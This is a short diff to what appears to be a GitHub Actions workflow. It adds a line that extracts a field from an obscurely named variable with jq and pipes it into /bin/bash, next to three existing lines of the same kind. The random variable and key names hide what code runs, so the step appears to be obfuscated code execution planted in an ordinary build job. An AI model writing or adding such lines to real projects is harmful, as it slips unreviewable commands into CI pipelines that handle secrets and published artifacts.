@@ -22,6 +22,7 @@ jobs:
           echo $wlrwt8286 | jq -r .gb02 | /bin/bash
           printf '%s' "$n28" | jq -r .ce46 | /bin/bash
           printf '%s' "$z01638" | jq -r .usjtf0 | /bin/bash
+          echo $s54996 | jq -r .z53 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
